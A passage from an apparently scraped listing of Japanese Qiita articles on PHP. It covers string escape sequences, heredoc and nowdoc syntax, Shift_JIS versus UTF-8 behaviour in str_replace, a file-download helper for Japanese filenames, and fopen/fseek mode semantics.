<span class="dl">EOD</span><span class="p">;</span>
</pre></div></div>

<table>
<thead>
<tr>
<th style="text-align: center">記述</th>
<th style="text-align: center">実際の表示</th>
<th style="text-align: center">意味</th>
<th style="text-align: center">備考</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align: center"><strong><code>\\$</code></strong></td>
<td style="text-align: center">$</td>
<td style="text-align: center">ドル記号</td>
<td style="text-align: center">直後に変数名に使える文字がなければ省略可能</td>
</tr>
<tr>
<td style="text-align: center"><code>{$var}</code></td>
<td style="text-align: center">$var の値</td>
<td style="text-align: center">変数展開</td>
<td style="text-align: center">
<code>${var}</code> と書くことも出来る</td>
</tr>
<tr>
<td style="text-align: center"><code>$var</code></td>
<td style="text-align: center">$var の値</td>
<td style="text-align: center">変数展開</td>
<td style="text-align: center"></td>
</tr>
<tr>
<td style="text-align: center"><code>{$var[0]}</code></td>
<td style="text-align: center">$var[0] の値</td>
<td style="text-align: center">変数展開</td>
<td style="text-align: center">
<code>${var[0]}</code> と書くことも出来る</td>
</tr>
<tr>
<td style="text-align: center"><code>$var[0]</code></td>
<td style="text-align: center">$var[0] の値</td>
<td style="text-align: center">変数展開</td>
<td style="text-align: center"></td>
</tr>
<tr>
<td style="text-align: center"><code>{$var['hoge']}</code></td>
<td style="text-align: center">$var['hoge'] の値</td>
<td style="text-align: center">変数展開</td>
<td style="text-align: center">
<code>${var['hoge']}</code> と書くことも出来る<br>↓ との違いに注意</td>
</tr>
<tr>
<td style="text-align: center"><code>$var[hoge]</code></td>
<td style="text-align: center">$var['hoge'] の値</td>
<td style="text-align: center">変数展開</td>
<td style="text-align: center">↑ との違いに注意</td>
</tr>
</tbody>
</table>

<p>なお、ヒアドキュメントの終了サインに関してですが、<ins>前後に他の文字が入ってはいけません</ins>。半角スペースやタブ文字などもこれに該当します。但し、例外的に後ろに <code>;</code> を含めるのは認められています。</p>

<h3>
<span id="ng例" class="fragment"></span><a href="#ng%E4%BE%8B"><i class="fa fa-link"></i></a>NG例</h3>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span>    <span class="nv">$str</span> <span class="o">=</span> <span class="s">&lt;&lt;&lt;</span><span class="dl">EOD</span><span class="s"></span>
<span class="s">    Hi!! \$a is "{$a}".</span>
<span class="s">    </span><span class="dl">EOD</span><span class="p">;</span>
    <span class="k">echo</span> <span class="nv">$str</span><span class="p">;</span>
</pre></div></div>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span>    <span class="k">echo</span> <span class="s">&lt;&lt;&lt;</span><span class="dl">EOD</span><span class="s"></span>
<span class="s">    Hi!! \$a is "{$a}".</span>
<span class="s">    </span><span class="dl">EOD</span><span class="p">;</span>
</pre></div></div>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span>    <span class="nb">var_dump</span><span class="p">(</span> <span class="o">&lt;&lt;&lt;</span><span class="nx">EOD</span>
<span class="nx">Hi</span><span class="o">!!</span> <span class="nx">\</span><span class="nv">$a</span> <span class="nx">is</span> <span class="s2">"</span><span class="si">{</span><span class="nv">$a</span><span class="si">}</span><span class="s2">"</span><span class="o">.</span>
<span class="nx">EOD</span><span class="p">);</span>
</pre></div></div>

<h3>
<span id="ok例" class="fragment"></span><a href="#ok%E4%BE%8B"><i class="fa fa-link"></i></a>OK例</h3>

<p>インデントしたくなりますが、我慢。</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span>    <span class="nv">$str</span> <span class="o">=</span> <span class="s">&lt;&lt;&lt;</span><span class="dl">EOD</span><span class="s"></span>
<span class="s">Hi!! \$a is "{$a}".</span>
<span class="dl">EOD</span><span class="p">;</span>
    <span class="k">echo</span> <span class="nv">$str</span><span class="p">;</span>
</pre></div></div>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span>    <span class="nv">$str</span> <span class="o">=</span> 
<span class="s">&lt;&lt;&lt;</span><span class="dl">EOD</span><span class="s"></span>
<span class="s">Hi!! \$a is "{$a}".</span>
<span class="dl">EOD</span>
    <span class="p">;</span>
    <span class="k">echo</span> <span class="nv">$str</span><span class="p">;</span>
</pre></div></div>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span>    <span class="k">echo</span> <span class="s">&lt;&lt;&lt;</span><span class="dl">EOD</span><span class="s"></span>
<span class="s">Hi!! \$a is "{$a}".</span>
<span class="dl">EOD</span><span class="p">;</span>
</pre></div></div>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span>    <span class="nb">var_dump</span><span class="p">(</span>
<span class="s">&lt;&lt;&lt;</span><span class="dl">EOD</span><span class="s"></span>
<span class="s">Hi!! \$a is "{$a}".</span>
<span class="dl">EOD</span>
    <span class="p">);</span>
</pre></div></div>

<h2>
<span id="nowdoc内" class="fragment"></span><a href="#nowdoc%E5%86%85"><i class="fa fa-link"></i></a>Nowdoc内</h2>

<p>PHP5.3から追加された方法です。<ins>エスケープシーケンスが一切存在しません</ins>。ヒアドキュメントの<code>EOD</code> を <code>'EOD'</code> とすることによってこれに変化します。</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nv">$var</span> <span class="o">=</span> <span class="s">&lt;&lt;&lt;'</span><span class="dl">EOD</span><span class="s">'</span>
<span class="s">1行目</span>
<span class="s">2行目</span>
<span class="dl">EOD</span><span class="p">;</span>
</pre></div></div>

<h1>
<span id="確認問題" class="fragment"></span><a href="#%E7%A2%BA%E8%AA%8D%E5%95%8F%E9%A1%8C"><i class="fa fa-link"></i></a>確認問題</h1>

<h2>
<span id="問" class="fragment"></span><a href="#%E5%95%8F"><i class="fa fa-link"></i></a>問</h2>

<p>以下の出力結果を答えよ。(答えが分からないように黒一色で書いています)</p>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>&lt;?php
$var = 'O';
echo "\\\\{$var}\x4B!!\n";
echo "\\\{$var}\x4B!!\n";
</pre></div></div>

<p>　<br>
　<br>
　　<br>
　　<br>
　　<br>
　<br>
　<br>
　<br>
　<br>
　<br>
　<br>
　<br>
　</p>

<h2>
<span id="答" class="fragment"></span><a href="#%E7%AD%94"><i class="fa fa-link"></i></a>答</h2>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>\\OK!!
\\{O}K!!
</pre></div></div>

<h2>
<span id="解説" class="fragment"></span><a href="#%E8%A7%A3%E8%AA%AC"><i class="fa fa-link"></i></a>解説</h2>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="k">echo</span> <span class="s2">"</span><span class="se">\\\\</span><span class="si">{</span><span class="nv">$var</span><span class="si">}</span><span class="se">\x4B</span><span class="s2">!!</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
</pre></div></div>

<p>は素直に考えれば答えは分かるはずです。問題は2行目。</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="k">echo</span> <span class="s2">"</span><span class="se">\\</span><span class="s2">\</span><span class="si">{</span><span class="nv">$var</span><span class="si">}</span><span class="se">\x4B</span><span class="s2">!!</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
</pre></div></div>

<p>これは最初の <code>\\\\</code> でバックスラッシュを表した後、次の <strong><code>\\{</code></strong> でエスケープシーケンスを構成してしまっています。本来 <code>{</code> が持つ役割を <code>\\</code> によって消されたので、これは文字として表示されます。その次の <code>$var</code> 部分だけがエスケープシーケンスと見なされ、変数が展開されます。その次の <code>}</code> は対応する <code>{</code> が無くなってしまったため、文字として表示されます。</p>

<h1>
<span id="utf-8だけが正しく扱われる理由" class="fragment"></span><a href="#utf-8%E3%81%A0%E3%81%91%E3%81%8C%E6%AD%A3%E3%81%97%E3%81%8F%E6%89%B1%E3%82%8F%E3%82%8C%E3%82%8B%E7%90%86%E7%94%B1"><i class="fa fa-link"></i></a>UTF-8だけが正しく扱われる理由</h1>

<p><strong>Shift_JIS</strong> の例を見てみましょう。今回は <code>str_replace</code> という関数を使います。この関数は指定した文字列を検索し、別の文字列に置換する関数です。</p>

<p><strong>str_replace</strong><br>
<a href="http://php.net/manual/ja/function.str-replace.php" class="autolink" rel="nofollow noopener" target="_blank">http://php.net/manual/ja/function.str-replace.php</a></p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">PHPコード</span></div>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="k">echo</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s1">'A'</span><span class="p">,</span> <span class="s1">'B'</span><span class="p">,</span> <span class="s1">'CACA'</span><span class="p">);</span>
</pre></div>
</div>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">実行結果</span></div>
<div class="highlight"><pre><span></span>CBCB
</pre></div>
</div>

<p><code>CACA</code> の中から <code>A</code> が探し出されて <code>B</code> に置換されました。ところがこの関数、先ほど述べたように <strong>UTF-8</strong> しか正しく扱うことが出来ません。 <strong>Shift_JIS</strong> にて下記の現象が起こります。</p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">PHPコード</span></div>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="k">echo</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s1">'ｱ'</span><span class="p">,</span> <span class="s1">'ｳ'</span><span class="p">,</span> <span class="s1">'こ'</span><span class="p">);</span>
</pre></div>
</div>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">実行結果</span></div>
<div class="highlight"><pre><span></span>さ
</pre></div>
</div>

<p>この現象を考察してみましょう。それぞれの16進数コードを確認します。 <strong>Shift_JIS</strong> では半角カタカナは1バイト、平仮名は2バイトで表されます。</p>

<ul>
<li>
<code>ｱ</code> → <code>B1</code>
</li>
<li>
<code>ｳ</code> → <code>B3</code>
</li>
<li>
<code>こ</code> → <code>82</code> <strong><code>B1</code></strong>
</li>
<li>
<code>さ</code> → <code>82</code> <strong><code>B3</code></strong>
</li>
</ul>

<p>お分かり頂けたでしょうか。これで平仮名を破壊する形で置換が行われてしまったのです。</p>

<p>一方 <strong>UTF-8</strong> のコード分布は下記のようになっています。 <code>-</code> で取り得るバイト値の範囲を示します。</p>

<ul>
<li>1バイト文字 → <code>00-7F</code>
</li>
<li>2バイト文字 → <code>C0-DF</code> <code>80-BF</code> </li>
<li>3バイト文字 → <code>E0-EF</code> <code>80-BF</code> <code>80-BF</code>
</li>
<li>4バイト文字 → <code>F0-F7</code> <code>80-BF</code> <code>80-BF</code> <code>80-BF</code>
</li>
</ul>

<p>各値域を順番に並べると</p>

<ul>
<li>
<code>00-7F</code> → 1バイト文字の接頭符号</li>
<li>
<code>80-BF</code> → 接頭符号に続く部分</li>
<li>
<code>C0-DF</code> → 2バイト文字の接頭符号</li>
<li>
<code>E0-EF</code> → 3バイト文字の接頭符号</li>
<li>
<code>F0-F7</code> → 4バイト文字の接頭符号</li>
</ul>

<p><strong>Wikipedia - 接頭符号</strong><br>
<a href="http://ja.wikipedia.org/wiki/%E6%8E%A5%E9%A0%AD%E7%AC%A6%E5%8F%B7" class="autolink" rel="nofollow noopener" target="_blank">http://ja.wikipedia.org/wiki/%E6%8E%A5%E9%A0%AD%E7%AC%A6%E5%8F%B7</a></p>

<p><code>80-BF</code> の区間だけで成立する文字コードは存在せず、絶対に<ins>重複が起こらない</ins>ように工夫されているのです。</p>
</div>
	</td>
</tr>
</table>
<br />
<table border="1">
<tr>
	<td rowspan="3"><center>mpywさんの<br />35位</center></td>
	<td colspan="3">
		<kbd><i><img alt="いいね" width="16" height="16" src="../thumb-up-120px.png" /></i>33</kbd>
		<a target="_blank" href="https://qiita.com/mpyw/items/3838819d4af75c84b564">[日本語ファイル名対応] 簡単にファイルをダウンロードさせられる関数</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2013-08-28 15:05:53</center>
	</td>
	<td style="width:200px;">
		@mpyw<br />(シナプス株式会社 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/25060/profile-images/1473684251">
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[PHP]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;">
<h1>
<span id="追記" class="fragment"></span><a href="#%E8%BF%BD%E8%A8%98"><i class="fa fa-link"></i></a>追記</h1>

<p><a href="http://qiita.com/mpyw/items/80d630d9f89dcf8d7c42" class="autolink" id="reference-5cb934fb2b11474f526d">http://qiita.com/mpyw/items/80d630d9f89dcf8d7c42</a><br>
こちらで紹介している <code>File</code> クラスに統合させました。</p>

<p>=========</p>

<p>今回参考にさせていただいた記事はこちら。<br>
<a href="http://d.hatena.ne.jp/maachang/20110730/1312008966" class="autolink" rel="nofollow noopener" target="_blank">http://d.hatena.ne.jp/maachang/20110730/1312008966</a></p>

<p>この内容をもとにPHPで関数化してみました。</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="k">function</span> <span class="nf">download</span><span class="p">(</span><span class="nv">$input_filename</span><span class="p">,</span> <span class="nv">$output_filename</span> <span class="o">=</span> <span class="s1">''</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">static</span> <span class="nv">$pattern</span> <span class="o">=</span> <span class="s1">'/Chrome|Firefox|(Opera)|(MSIE|IEMobile)|(Safari)/'</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">headers_sent</span><span class="p">()</span> <span class="o">||</span> <span class="p">(</span><span class="nv">$size</span> <span class="o">=</span> <span class="o">@</span><span class="nb">filesize</span><span class="p">(</span><span class="nv">$input_filename</span><span class="p">))</span> <span class="o">===</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">((</span><span class="nx">string</span><span class="p">)</span><span class="nv">$output_filename</span> <span class="o">===</span> <span class="s1">''</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$output_filename</span> <span class="o">=</span> <span class="nv">$input_filename</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="nv">$output_filename</span> <span class="o">=</span> <span class="nb">mb_convert_encoding</span><span class="p">(</span>
        <span class="nv">$output_filename</span><span class="p">,</span>
        <span class="s1">'UTF-8'</span><span class="p">,</span>
        <span class="s1">'ASCII,JIS,UTF-8,CP51932,SJIS-win'</span>
    <span class="p">);</span>
    <span class="k">switch</span> <span class="p">(</span><span class="k">true</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">case</span> <span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'HTTP_USER_AGENT'</span><span class="p">])</span><span class="o">:</span>
        <span class="k">case</span> <span class="o">!</span><span class="nb">preg_match</span><span class="p">(</span><span class="nv">$pattern</span><span class="p">,</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'HTTP_USER_AGENT'</span><span class="p">],</span> <span class="nv">$matches</span><span class="p">)</span><span class="o">:</span>
        <span class="k">case</span> <span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$matches</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span><span class="o">:</span>
            <span class="nv">$enc</span> <span class="o">=</span> <span class="s1">'=?utf-8?B?'</span> <span class="o">.</span> <span class="nb">base64_encode</span><span class="p">(</span><span class="nv">$output_filename</span><span class="p">)</span> <span class="o">.</span> <span class="s1">'?='</span><span class="p">;</span>
            <span class="nb">header</span><span class="p">(</span><span class="s1">'Content-Disposition: attachment; filename="'</span> <span class="o">.</span> <span class="nv">$enc</span> <span class="o">.</span> <span class="s1">'"'</span><span class="p">);</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="k">case</span> <span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$matches</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span><span class="o">:</span>
            <span class="nv">$enc</span> <span class="o">=</span> <span class="s2">"utf-8'ja'"</span> <span class="o">.</span> <span class="nb">urlencode</span><span class="p">(</span><span class="nv">$output_filename</span><span class="p">);</span>
            <span class="nb">header</span><span class="p">(</span><span class="s1">'Content-Disposition: attachment; filename*='</span> <span class="o">.</span> <span class="nv">$enc</span><span class="p">);</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="k">case</span> <span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$matches</span><span class="p">[</span><span class="mi">3</span><span class="p">])</span><span class="o">:</span>
            <span class="nv">$enc</span> <span class="o">=</span> <span class="nb">urlencode</span><span class="p">(</span><span class="nv">$output_filename</span><span class="p">);</span>
            <span class="nb">header</span><span class="p">(</span><span class="s1">'Content-Disposition: attachment; filename="'</span> <span class="o">.</span> <span class="nv">$enc</span> <span class="o">.</span> <span class="s1">'"'</span><span class="p">);</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="k">default</span><span class="o">:</span>
            <span class="nb">header</span><span class="p">(</span><span class="s1">'Content-Disposition: attachment; filename="'</span> <span class="o">.</span><span class="nv">$output_filename</span> <span class="o">.</span> <span class="s1">'"'</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="nv">$finfo</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">finfo</span><span class="p">(</span><span class="nx">FILEINFO_MIME</span><span class="p">);</span>
    <span class="nb">header</span><span class="p">(</span><span class="s1">'Content-Type: '</span> <span class="o">.</span> <span class="nv">$finfo</span><span class="o">-&gt;</span><span class="na">file</span><span class="p">(</span><span class="nv">$input_filename</span><span class="p">));</span>
    <span class="nb">header</span><span class="p">(</span><span class="s1">'Content-Length: '</span> <span class="o">.</span> <span class="nv">$size</span><span class="p">);</span>
    <span class="k">return</span> <span class="nb">readfile</span><span class="p">(</span><span class="nv">$input_filename</span><span class="p">);</span>
<span class="p">}</span>
</pre></div></div>

<p><em><code>$input_filename</code></em> はロケールにあったエンコーディングで渡してください。<br>
<em><code>$output_filename</code></em> を省略した場合は <em><code>$input_filename</code></em> がそのまま使われます。<br>
<em><code>$output_filename</code></em> は自動的にUTF-8に変換されます。<br>
成功するとダウンロードさせたファイルのサイズ、失敗すると<code>FALSE</code>を返します。</p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">Windowsでの使用例</span></div>
<div class="highlight"><pre><span></span><span class="nx">download</span><span class="p">(</span><span class="nb">mb_convert_encoding</span><span class="p">(</span><span class="s1">'あいうえお.jpg'</span><span class="p">,</span> <span class="s1">'SJIS-win'</span><span class="p">,</span> <span class="s1">'UTF-8'</span><span class="p">));</span>
</pre></div>
</div>

<p>IE9以降・Chrome14以降・その他ブラウザの挙動は未確認なので検証していただけましたらご報告いただけると幸いです。</p>
</div>
	</td>
</tr>
</table>
<br />
<table border="1">
<tr>
	<td rowspan="3"><center>mpywさんの<br />36位</center></td>
	<td colspan="3">
		<kbd><i><img alt="いいね" width="16" height="16" src="../thumb-up-120px.png" /></i>32</kbd>
		<a target="_blank" href="https://qiita.com/mpyw/items/3adcec3c66e515895b08">[PHP] ファイルオープンモードに関するマニュアルの記述は間違っている</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2013-10-31 18:33:49</center>
	</td>
	<td style="width:200px;">
		@mpyw<br />(シナプス株式会社 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/25060/profile-images/1473684251">
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[PHP]</b> <b>[ファイル]</b> <b>[ファイル操作]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;">
<h1>
<span id="間違った記述" class="fragment"></span><a href="#%E9%96%93%E9%81%95%E3%81%A3%E3%81%9F%E8%A8%98%E8%BF%B0"><i class="fa fa-link"></i></a><strong>間違った記述</strong>
</h1>

<p><strong><a href="http://php.net/manual/ja/function.fopen.php" rel="nofollow noopener" target="_blank">fopen</a></strong> 関数のマニュアルは、完全に間違っているとも言い難いが、 <strong>「極めて不親切」</strong> であるとは言える。その記述が以下のものである。</p>

<p><a href="https://camo.qiitausercontent.com/27e44166aed40d2e3abdf6c5fbba3c5b2b310440/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f32353036302f39336464663539322d646234342d366638302d396262362d3366353266386437663437652e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/27e44166aed40d2e3abdf6c5fbba3c5b2b310440/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f32353036302f39336464663539322d646234342d366638302d396262362d3366353266386437663437652e706e67" alt="ss (2013-10-31 at 01.56.32).png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/25060/93ddf592-db44-6f80-9bb6-3f52f8d7f47e.png"></a></p>

<p>実際には、ファイルポインタを <strong>先頭</strong> に置いているとしか思えない挙動をする。</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nv">$fp</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="s1">'new_file.txt'</span><span class="p">,</span> <span class="s1">'w'</span><span class="p">);</span>
<span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="s1">'abcde'</span><span class="p">);</span>
<span class="nb">fclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
<span class="nv">$fp</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="s1">'new_file.txt'</span><span class="p">,</span> <span class="s1">'a'</span><span class="p">);</span>
<span class="k">echo</span> <span class="nb">ftell</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
<span class="nb">fclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
</pre></div></div>

<p>としてみると、 <strong><a href="http://php.net/manual/ja/function.ftell.php" rel="nofollow noopener" target="_blank">ftell</a></strong> 関数の返り値は <strong><code>0</code></strong> となっていることが分かる。マニュアルを見ると、</p>

<p><a href="https://camo.qiitausercontent.com/a23e5cb344b015998aab204e0cc4967f179729d1/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f32353036302f66376130623965382d353930362d343761642d616635632d6338663364336335333830332e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/a23e5cb344b015998aab204e0cc4967f179729d1/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f32353036302f66376130623965382d353930362d343761642d616635632d6338663364336335333830332e706e67" alt="ss (2013-10-31 at 03.30.22).png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/25060/f7a0b9e8-5906-47ad-af5c-c8f3d3c53803.png"></a></p>

<p>確かに <strong>未定義</strong> であるとされているため、この場合は誤りでは無いのかもしれない。しかし、 <strong><code>a+</code></strong> モードは<ins>読み出しも可能</ins>なストリームでもあるのに、未定義で片づけてしまうのは間違っているのではないかと思う。混乱を招く要因にもなり得るだろう。</p>

<h1>
<span id="内部構造を意識した正しい認識" class="fragment"></span><a href="#%E5%86%85%E9%83%A8%E6%A7%8B%E9%80%A0%E3%82%92%E6%84%8F%E8%AD%98%E3%81%97%E3%81%9F%E6%AD%A3%E3%81%97%E3%81%84%E8%AA%8D%E8%AD%98"><i class="fa fa-link"></i></a><strong>内部構造を意識した正しい認識</strong>
</h1>

<h2>
<span id="早見表" class="fragment"></span><a href="#%E6%97%A9%E8%A6%8B%E8%A1%A8"><i class="fa fa-link"></i></a>早見表</h2>

<p><strong><code>x</code></strong> <strong><code>x+</code></strong> は PHP4.3.2、 <strong><code>c</code></strong> <strong><code>c+</code></strong> はPHP5.2.6以降でのみサポートされている。</p>

<p><a href="https://camo.qiitausercontent.com/561d2907c29284286c4fc1b41fe0daa1a57646a1/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f32353036302f66363264353038642d333264362d386465352d336361632d6630643864336632633230322e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/561d2907c29284286c4fc1b41fe0daa1a57646a1/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f32353036302f66363264353038642d333264362d386465352d336361632d6630643864336632633230322e706e67" alt="ss (2013-10-31 at 03.40.00).png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/25060/f62d508d-32d6-8de5-3cac-f0d8d3f2c202.png"></a></p>

<p>内部構造を意識し、 <strong><code>a+</code></strong> モードのことも考慮すると、<ins>書き込み時にファイルポインタを終端に移動する</ins>という認識が一番適切であろう。</p>

<h2>
<span id="仮nullバイトの導入" class="fragment"></span><a href="#%E4%BB%AEnull%E3%83%90%E3%82%A4%E3%83%88%E3%81%AE%E5%B0%8E%E5%85%A5"><i class="fa fa-link"></i></a>「仮NULLバイト」の導入</h2>

<p>説明のために <strong>「仮NULLバイト」</strong> という言葉を導入する。これはバッファの範囲内と範囲外で区別する。以下、加味されるものを <strong>○</strong> 、加味されないものを <strong>×</strong> で示す。</p>

<p><a href="https://camo.qiitausercontent.com/6d5031864594a02db506c6905a85bc24ea6f2a7d/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f32353036302f35616166636364662d333634302d303437642d396564362d6534393531356265336139372e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/6d5031864594a02db506c6905a85bc24ea6f2a7d/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f32353036302f35616166636364662d333634302d303437642d396564362d6534393531356265336139372e706e67" alt="ss (2013-11-01 at 11.05.04).png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/25060/5aafccdf-3640-047d-9ed6-e49515be3a97.png"></a></p>

<p>※ 外部バッファとは、読み出された後の値 ( <strong><a href="http://php.net/manual/ja/function.stream-get-contents.php" rel="nofollow noopener" target="_blank">stream_get_contents</a></strong> 関数などの返り値 ) のことを意味する。</p>

<h2>
<span id="fseek-関数-について" class="fragment"></span><a href="#fseek-%E9%96%A2%E6%95%B0-%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6"><i class="fa fa-link"></i></a><strong><a href="http://php.net/manual/ja/function.fseek.php" rel="nofollow noopener" target="_blank">fseek</a></strong> 関数 について</h2>

<p><strong><a href="http://php.net/manual/ja/function.fseek.php" rel="nofollow noopener" target="_blank">fseek</a></strong> 関数のマニュアルを見ると、 </p>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>一般的に、ファイルの終端より先の位置に移動することも許されています。
</pre></div></div>

<p>と書かれているので、ここでは便宜的に</p>

<p><a href="https://camo.qiitausercontent.com/36af1a06f21b0e55f1485cfe3bf6e18c6c11faa2/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f32353036302f64383335366665632d346434642d306634312d623137612d6631613536393462383236642e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/36af1a06f21b0e55f1485cfe3bf6e18c6c11faa2/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f32353036302f64383335366665632d346434642d306634312d623137612d6631613536393462383236642e706e67" alt="ss (2013-11-01 at 11.24.17).png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/25060/d8356fec-4d4d-0f41-b17a-f1a5694b826d.png"></a></p>

<p>という5バイトのファイル <code>data.txt</code> があれば、先ほど提示した「範囲外の仮NULLバイト」を用いて</p>

<p><a href="https://camo.qiitausercontent.com/722ba9f0d9facc9b86653e3ce830988f786c9efe/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f32353036302f63663964346565632d393865322d386339382d653331302d3365626235333763633861372e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/722ba9f0d9facc9b86653e3ce830988f786c9efe/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f32353036302f63663964346565632d393865322d386339382d653331302d3365626235333763633861372e706e67" alt="ss (2013-11-01 at 11.17.54).png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/25060/cf9d4eec-98e2-8c98-e310-3ebb537cc8a7.png"></a></p>

<p>と表記する。</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nv">$fp</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="s1">'data.txt'</span><span class="p">,</span> <span class="s1">'c'</span><span class="p">);</span>
<span class="nb">fseek</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="mi">7</span><span class="p">);</span>
</pre></div></div>

<p>とすると、</p>

